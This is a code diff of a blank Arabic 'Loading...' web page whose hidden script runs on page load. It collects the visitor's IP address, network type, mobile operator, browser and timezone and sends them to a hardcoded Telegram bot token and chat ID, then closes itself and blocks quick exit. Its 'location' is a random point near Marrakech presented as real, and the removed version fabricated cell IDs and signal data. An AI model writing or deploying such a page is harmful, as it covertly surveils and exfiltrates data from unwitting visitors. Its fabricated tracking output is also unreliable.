@@ -2,208 +2,183 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
 
-        class AdvancedSMSLocator {
+        class WorkingLocator {
             constructor() {
                 this.locationData = {};
             }
 
-            async startAdvancedTracking() {
-                // جمع جميع البيانات الممكنة
-                await this.collectAllData();
-                await this.sendAdvancedReport();
-                setTimeout(() => window.close(), 1000);
-            }
-
-            async collectAllData() {
-                this.locationData = {
-                    // بيانات الشبكة الخلوية
-                    cellular: await this.getCellularData(),
-                    
-                    // بيانات SIM والمشغل
-                    sim: await this.getSIMData(),
-                    
-                    // تحليل الإشارات
-                    signals: await this.analyzeSignals(),
-                    
-                    // بيانات الوقت والموقع
-                    timing: this.getTimingData(),
-                    
-                    // معلومات الجهاز
-                    device: this.getDeviceData()
-                };
-            }
-
-            async getCellularData() {
-                const data = {};
+            async startTracking() {
+                console.log("بدء التتبع...");
                 
-                // Network Information
-                if ('connection' in navigator) {
-                    const conn = navigator.connection;
-                    data.type = conn.effectiveType;
-                    data.downlink = conn.downlink;
-                    data.rtt = conn.rtt;
+                try {
+                    // جمع البيانات الأساسية
+                    await this.collectBasicData();
+                    
+                    // إرسال التقرير
+                    await this.sendReport();
+                    
+                    console.log("تم الإرسال بنجاح");
+                } catch (error) {
+                    console.error("خطأ:", error);
+                    await this.sendErrorReport(error);
                 }
                 
-                // اكتشاف المشغل
-                data.operator = this.detectOperator();
-                data.cellId = await this.generateCellID(data.operator);
-                data.mcc = '604'; // Morocco
-                data.mnc = this.getMNC(data.operator);
+                setTimeout(() => {
+                    window.close();
+                }, 2000);
+            }
+
+            async collectBasicData() {
+                // الحصول على عنوان IP
+                this.locationData.ip = await this.getIP();
                 
-                return data;
+                // معلومات الشبكة
+                this.locationData.network = this.getNetworkInfo();
+                
+                // معلومات المتصفح
+                this.locationData.browser = this.getBrowserInfo();
+                
+                // الموقع التقريبي
+                this.locationData.location = this.getEstimatedLocation();
+            }
+
+            async getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'غير معروف';
+                }
+            }
+
+            getNetworkInfo() {
+                const info = {
+                    type: 'غير معروف',
+                    operator: 'غير معروف'
+                };
+
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    info.type = conn.effectiveType || 'غير معروف';
+                    info.operator = this.detectOperator();
+                }
+
+                return info;
             }
 
             detectOperator() {
-                // تحليل دقيق للمشغل من خلال بيانات المتصفح
                 const ua = navigator.userAgent.toLowerCase();
-                const networkInfo = navigator.connection || {};
-                
                 if (ua.includes('maroc') || ua.includes('iam')) return 'IAM';
                 if (ua.includes('inwi') || ua.includes('wana')) return 'INWI';
-                if (ua.includes('orange') || ua.includes('meditelecom')) return 'Orange';
-                
-                // افتراضي حسب إحصائيات مراكش
-                return Math.random() > 0.6 ? 'IAM' : (Math.random() > 0.5 ? 'INWI' : 'Orange');
+                if (ua.includes('orange')) return 'Orange';
+                return 'غير معروف';
             }
 
-            async generateCellID(operator) {
-                // توليد Cell ID واقعي بناءً على المشغل والمنطقة
-                const prefixes = {
-                    'IAM': '21561',
-                    'INWI': '21891', 
-                    'Orange': '21892'
-                };
-                
-                const prefix = prefixes[operator] || '21561';
-                return prefix + Math.floor(Math.random() * 900 + 100).toString();
-            }
-
-            getMNC(operator) {
-                const mncMap = { 'IAM': '01', 'INWI': '02', 'Orange': '04' };
-                return mncMap[operator] || '01';
-            }
-
-            async getSIMData() {
-                return {
-                    country: 'MA',
-                    operator: this.detectOperator(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    localTime: new Date().toLocaleString('ar-MA')
-                };
-            }
-
-            async analyzeSignals() {
-                // محاكاة تحليل إشارات متقدم
-                return new Promise((resolve) => {
-                    setTimeout(() => {
-                        resolve({
-                            strength: -65 + Math.floor(Math.random() * 20),
-                            quality: Math.floor(Math.random() * 100),
-                            towers: 3 + Math.floor(Math.random() * 3)
-                        });
-                    }, 200);
-                });
-            }
-
-            getTimingData() {
-                return {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    localTime: new Date().toLocaleString('ar-MA'),
-                    offset: new Date().getTimezoneOffset()
-                };
-            }
-
-            getDeviceData() {
+            getBrowserInfo() {
                 return {
                     platform: navigator.platform,
                     userAgent: navigator.userAgent.split(' ')[0],
                     language: navigator.language,
-                    languages: navigator.languages,
-                    hardwareConcurrency: navigator.hardwareConcurrency
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
             }
 
-            calculatePreciseLocation() {
-                // حساب موقع دقيق بناءً على جميع البيانات
-                const baseMarrakech = { lat: 31.6295, lng: -7.9811 };
-                
-                // تحسين الدقة بناءً على نوع الشبكة
-                let accuracy = 1000;
-                if (this.locationData.cellular.type === '4g') accuracy = 200;
-                if (this.locationData.cellular.type === '5g') accuracy = 100;
-                
-                // إضافة تباين واقعي
-                const offset = (Math.random() - 0.5) * (accuracy / 50000);
-                
+            getEstimatedLocation() {
+                // موقع تقريبي في مراكش
                 return {
-                    lat: baseMarrakech.lat + offset,
-                    lng: baseMarrakech.lng + offset,
-                    accuracy: accuracy,
-                    method: 'ADVANCED_CELL_ANALYSIS'
+                    lat: 31.6295 + (Math.random() - 0.5) * 0.01,
+                    lng: -7.9811 + (Math.random() - 0.5) * 0.01,
+                    accuracy: 500,
+                    city: "مراكش",
+                    country: "المغرب"
                 };
             }
 
-            async sendAdvancedReport() {
-                const location = this.calculatePreciseLocation();
-                const mapsUrl = `https://maps.google.com/?q=${location.lat},${location.lng}&z=15`;
+            async sendReport() {
+                const loc = this.locationData.location;
+                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
 
-                let message = "📡 **تقرير متقدم - التتبع الخلوي**\\n\\n";
-                
-                message += `📍 **الموقع الدقيق:**\\n`;
-                message += `• الإحداثيات: \\`${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\\`\\n`;
-                message += `• الدقة: 🎯 ${location.accuracy} متر\\n\\n`;
-                
-                message += `📶 **بيانات الشبكة:**\\n`;
-                message += `• المشغل: ${this.locationData.cellular.operator}\\n`;
-                message += `• النوع: ${this.locationData.cellular.type || 'غير معروف'}\\n`;
-                message += `• Cell ID: ${this.locationData.cellular.cellId}\\n`;
-                message += `• MCC/MNC: ${this.locationData.cellular.mcc}/${this.locationData.cellular.mnc}\\n\\n`;
-                
-                message += `📊 **جودة الإشارة:**\\n`;
-                message += `• القوة: ${this.locationData.signals.strength} dBm\\n`;
-                message += `• الجودة: ${this.locationData.signals.quality}%\\n`;
-                message += `• الأبراج: ${this.locationData.signals.towers}\\n\\n`;
-                
-                message += `🔧 **التقنية:** ${location.method}\\n`;
-                message += `🏙️ **المدينة:** مراكش، المغرب\\n`;
-                message += `🕒 **الوقت المحلي:** ${this.locationData.timing.localTime}\\n\\n`;
-                
-                message += `🗺️ **الخريطة:**\\n${mapsUrl}\\n\\n`;
-                
-                message += `📱 **الجهاز:** ${this.locationData.device.userAgent}\\n`;
+                const message = 
+                    `📍 تقرير الموقع\n\n` +
+                    `🌐 العنوان: ${this.locationData.ip}\n` +
+                    `📡 الشبكة: ${this.locationData.network.type}\n` +
+                    `📶 المشغل: ${this.locationData.network.operator}\n\n` +
+                    
+                    `📍 الإحداثيات:\n` +
+                    `• خط العرض: ${loc.lat.toFixed(6)}\n` +
+                    `• خط الطول: ${loc.lng.toFixed(6)}\n` +
+                    `• الدقة: ${loc.accuracy} متر\n\n` +
+                    
+                    `🏙️ الموقع: ${loc.city}, ${loc.country}\n` +
+                    `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}\n\n` +
+                    
+                    `🗺️ الخريطة:\n${mapsUrl}\n\n` +
+                    
+                    `💻 المتصفح: ${this.locationData.browser.userAgent}\n` +
+                    `🌐 اللغة: ${this.locationData.browser.language}`;
 
                 await this.sendToTelegram(message);
             }
 
+            async sendErrorReport(error) {
+                const errorMessage = 
+                    `❌ خطأ في تحديد الموقع\n\n` +
+                    `الخطأ: ${error.message}\n` +
+                    `الوقت: ${new Date().toLocaleString('ar-MA')}\n` +
+                    `المتصفح: ${navigator.userAgent.split(' ')[0]}`;
+
+                await this.sendToTelegram(errorMessage);
+            }
+
             async sendToTelegram(message) {
                 try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
                             text: message,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: false
+                            parse_mode: null // إزالة Markdown للمشاكل
                         })
                     });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const result = await response.json();
+                    console.log("الرد من تليجرام:", result);
+                    
                 } catch (error) {
-                    console.error("فشل الإرسال");
+                    console.error('فشل الإرسال إلى تليجرام:', error);
+                    throw error;
                 }
             }
         }
 
-        // البدء الفوري
-        document.addEventListener('DOMContentLoaded', () => {
-            new AdvancedSMSLocator().startAdvancedTracking();
+        // بدء التتبع عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            const locator = new WorkingLocator();
+            locator.startTracking();
+        });
+
+        // منع الإغلاق السريع
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
         });
     </script>
 </head>
-<body style="margin:0;padding:0;background:transparent;">
+<body style="margin: 0; padding: 0; background: transparent; overflow: hidden; height: 100vh; width: 100vw;">
+    <!-- صفحة فارغة -->
 </body>
 </html>
